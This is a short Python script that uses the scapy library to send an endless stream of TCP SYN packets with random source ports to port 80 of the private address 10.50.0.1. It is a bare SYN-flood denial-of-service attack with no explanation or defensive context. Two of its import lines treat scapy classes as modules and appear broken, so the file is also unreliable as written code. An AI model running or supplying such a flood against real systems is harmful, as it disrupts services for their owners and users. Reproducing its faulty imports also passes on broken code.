#!/usr/bin/python
from scapy.all import *
import scapy.all.IP
import scapy.all.TCP
p=IP(dst='10.50.0.1')/TCP(flags="S",  sport=RandShort(),  dport=int(80))
send(p,  verbose=0, loop=1)
